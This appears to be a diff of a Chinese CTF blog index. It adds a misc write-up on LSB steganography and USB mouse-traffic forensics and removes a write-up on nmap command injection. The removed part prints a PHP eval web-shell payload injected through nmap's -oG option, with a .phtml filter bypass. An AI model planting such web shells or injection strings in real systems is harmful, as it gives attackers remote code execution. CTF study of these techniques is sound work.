@@ -169,6 +169,78 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-lsb最低位解密usb流量取证分析" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/09/13/lsb%E6%9C%80%E4%BD%8E%E4%BD%8D%E8%A7%A3%E5%AF%86usb%E6%B5%81%E9%87%8F%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/" class="article-date">
+  	<time datetime="2021-09-12T16:00:00.000Z" itemprop="datePublished">2021-09-13</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/13/lsb%E6%9C%80%E4%BD%8E%E4%BD%8D%E8%A7%A3%E5%AF%86usb%E6%B5%81%E9%87%8F%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/">
+        lsb最低位解密及usb流量取证分析
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="lsb最低位解密及usb流量取证分析"><a href="#lsb最低位解密及usb流量取证分析" class="headerlink" title="lsb最低位解密及usb流量取证分析"></a>lsb最低位解密及usb流量取证分析</h1><p>下载题目后，发现是一个解压包，而且有多层解密，所以我们可以使用脚本来对文件进行多层解压，而每层zip文件中都有story，而在story中会有关键的信息，但不知道是那一层，而story中隐藏信息不知道哪来的思路，我也只是看别人的wp，解压脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from zipfile import ZipFile</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(1,520):</span><br><span class="line">	str1=&quot;D:/比赛临时文档/羊城杯/temp/&quot;</span><br><span class="line">	str1=str1+str(520-i)+&quot;.zip&quot;</span><br><span class="line">	f = ZipFile(str1,&#x27;r&#x27;)</span><br><span class="line">	for file in f.namelist():</span><br><span class="line">		f.extract(file,&quot;D:/比赛临时文档/羊城杯/temp/&quot;)</span><br><span class="line">	with open(&quot;D:/比赛临时文档/羊城杯/temp/story&quot;,&#x27;r&#x27;,encoding=&#x27;UTF-8&#x27;) as f:</span><br><span class="line">		str2=f.read()</span><br><span class="line">		if &#x27;png&#x27; in str2:</span><br><span class="line">			pass</span><br><span class="line">		else:</span><br><span class="line">			print(str2)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>运行脚本，解压文件，并会输出特殊的story的信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">这都被你发现了？</span><br><span class="line">我这故事不错吧，嘻嘻嘻</span><br><span class="line">那就把flag给你吧</span><br><span class="line">oh，不，还有一半藏在了pcap的心里，快去找找吧</span><br><span class="line">左心房右心房，扑通扑通的心，咿呀咿呀的❤</span><br><span class="line">72, 89, 75, 88, 128, 93, 58, 116, 76, 121, 120, 63, 108,</span><br></pre></td></tr></table></figure>
+<p>我们可以知道一部分的flag，而且我们还可以得到一张flag.png，而根据题目的提示，我们可以判断是LSB最低位解密，也可以使用zsteg来对png图片进行扫描，从而发现有flag.pcap文件，所以此时我们可以使用LSBsteg.py来进行解密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LSBsteg.py decode -i flag.png -o flag.zip</span><br></pre></td></tr></table></figure>
+<p>所以我们可以使用ARCHPR软件来破解，密码是12345，解压后我们看见flag.pcap，然后看见flag.pcap文件的内容，我们可以判断是usb流量分析，然后从流量包中可以看见流量信息为4个字节，而由于鼠标移动时表现为连续性，与键盘击键的离散性不一样，但实际上鼠标动作所产生的数据包也是离散的。不同的鼠标抓到的流量不一样，一般的鼠标流量都是四个字节，所以判断是鼠标流量，因此可以用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r usb2.pcap -T fields -e usb.capdata &gt; usbdata.txt</span><br></pre></td></tr></table></figure>
+<p>来获取信息，但是这个exe在wireshark文件夹里面，所以要将flag.pcap放在wireshark文件夹里，然后在相应的文件夹的cmd命令行中执行上面的命令，然后用exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">f = open(&#x27;xy.txt&#x27;,&#x27;w&#x27;)</span><br><span class="line">DataFileName = &quot;2.txt&quot;</span><br><span class="line">def main():</span><br><span class="line">    # get argv</span><br><span class="line">    pcapFilePath = sys.argv[1]</span><br><span class="line"></span><br><span class="line">    # get data of pcap</span><br><span class="line">    os.system(&quot;tshark -r %s -T fields -e usb.capdata &gt; %s&quot; % (pcapFilePath, DataFileName))</span><br><span class="line"></span><br><span class="line">with open(&#x27;2.txt&#x27;,&#x27;r&#x27;) as keys:</span><br><span class="line">	posx = 0</span><br><span class="line">	posy = 0</span><br><span class="line">	for line in keys:</span><br><span class="line">		if len(line) != 12 :</span><br><span class="line">			continue</span><br><span class="line">		x = int(line[3:5],16)</span><br><span class="line">		y = int(line[6:8],16)</span><br><span class="line">		if x &gt; 127 :</span><br><span class="line">			x -= 256</span><br><span class="line">		if y &gt; 127 :</span><br><span class="line">			y -= 256</span><br><span class="line">		posx += x</span><br><span class="line">		posy += y</span><br><span class="line">		btn_flag = int(line[0:2],16)	</span><br><span class="line">		if btn_flag == 2 : #2为右键，1为左键</span><br><span class="line">        			f.write(str(posx)+&quot;,&quot;)</span><br><span class="line">        			f.write(str(posy)+&#x27;\n&#x27;)</span><br><span class="line">	f.close()</span><br><span class="line">	keys.close()</span><br></pre></td></tr></table></figure>
+<p>来获取坐标点，然后用这个exp来画散点图，获取剩下的flag，但是上面那个脚本需要左键跑完，右键再跑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">import random</span><br><span class="line">from matplotlib.pyplot import MultipleLocator</span><br><span class="line"></span><br><span class="line">x=[]</span><br><span class="line">y=[]</span><br><span class="line"></span><br><span class="line">with open(&quot;xy.txt&quot;,&#x27;r&#x27;) as f:</span><br><span class="line">    for line in f:</span><br><span class="line">        strlist=line.split(&#x27;,&#x27;)</span><br><span class="line">        y.append(int(strlist[0]))</span><br><span class="line">        x.append(int(strlist[1].replace(&#x27;\n&#x27;,&#x27;&#x27;)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plt.scatter(x,y,s=30)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
+<p>然后得到剩余数字，然后提示有flag头部为GWHT，所以看它们的ascii码，然后与得到的数字进行对比，然后发现规律，exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s=[72,89,75,88,128,93,58,116,76,121,120,63,108,94,51,134,119,146,130,63,111]</span><br><span class="line">for i in range(1,22):</span><br><span class="line">	print(chr(int(s[i-1]-i)))</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-session条件竞争" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -926,78 +998,6 @@ __destruct()--------------------在类的对象被销毁之前被调用
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-nmap特性" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/09/07/nmap%E7%89%B9%E6%80%A7/" class="article-date">
-  	<time datetime="2021-09-06T16:00:00.000Z" itemprop="datePublished">2021-09-07</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/09/07/nmap%E7%89%B9%E6%80%A7/">
-        nmap特性
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="nmap命令执行"><a href="#nmap命令执行" class="headerlink" title="nmap命令执行"></a>nmap命令执行</h1><p>打开页面后，我们可以看见nmap，然后又看见是扫描ip的，所以我们可以知道它是使用nmap来扫描局域网内的ip地址的，而nmap命令有个可以创建并写代码的命令</p>
-<p>可以构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;?php @eval($_POST[&quot;hack&#x27;]);?&gt; -oG hack.php&#x27;</span><br></pre></td></tr></table></figure>
-<p>来创建一个hack.php文件并在文件中写上</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&quot;hack&quot;]);?&gt;</span><br></pre></td></tr></table></figure>
-<p>然后访问</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://url/hack.php</span><br></pre></td></tr></table></figure>
-<p>即可以访问hack.php文件</p>
-<p>但是这里php被过滤掉了，所以我们可以使用phtml文件，可以构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;?=@eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml&#x27;</span><br></pre></td></tr></table></figure>
-<p>然后访问hack.phtml文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://url/hack.phtml</span><br></pre></td></tr></table></figure>
-<p>此时我们可以利用蚁剑连接就行</p>
-<p>这个可以和“escapeshellarg和escapeshellcmd函数重过滤绕过”这一篇文章结合着看</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li></ul>
 	</div>
 
       
